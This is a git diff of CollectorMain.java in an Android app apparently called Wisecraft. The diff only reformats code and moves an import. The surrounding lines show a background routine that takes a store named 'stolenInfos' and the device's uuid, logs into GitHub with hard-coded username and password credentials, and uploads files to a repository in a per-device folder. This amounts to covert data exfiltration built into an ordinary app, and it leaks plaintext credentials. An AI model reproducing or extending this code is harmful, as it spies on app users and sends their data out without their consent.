@@ -15,6 +15,7 @@ import android.util.Log;
 import com.google.gson.Gson;
 import com.google.gson.reflect.TypeToken;
 import com.nao20010128nao.Wisecraft.misc.BinaryPrefImpl;
+import com.nao20010128nao.Wisecraft.misc.Server;
 import com.nao20010128nao.Wisecraft.misc.compat.CompatCharsets;
 import java.net.URL;
 import java.security.MessageDigest;
@@ -24,7 +25,6 @@ import org.eclipse.egit.github.core.service.ContentsService;
 import org.eclipse.egit.github.core.service.RepositoryService;
 
 import static com.nao20010128nao.Wisecraft.Utils.*;
-import com.nao20010128nao.Wisecraft.misc.Server;
 
 public class CollectorMain extends ContextWrapper implements Runnable {
 	static boolean running=false;
@@ -36,12 +36,12 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 	@Override
 	public void run() {
 		// TODO: Implement this method
-		if(running){
+		if (running) {
 			return;
 		}
 		BinaryPrefImpl sb=TheApplication.instance.stolenInfos;
 		String uuid=TheApplication.instance.uuid;
-		running=true;
+		running = true;
 		try {
 			GitHubClient ghc=new GitHubClient().setCredentials("RevealEverything", "nao2001nao");
 			Repository repo=null;
@@ -65,7 +65,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 			try {
 				for (String filename:files) {
 					String actual=filename;
-					filename=uuid+"/"+filename;
+					filename = uuid + "/" + filename;
 					Log.d("repo", "upload:" + filename);
 					try {
 						Map<String, String> params = new HashMap<>();
@@ -108,7 +108,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 				try {
 					if (fos != null)fos.close();
 				} catch (IOException e) {}
-				running=false;
+				running = false;
 			}
 			for (String s:sb.getAll().keySet().toArray(new String[sb.getAll().size()])) {
 				Log.d("remain", s);
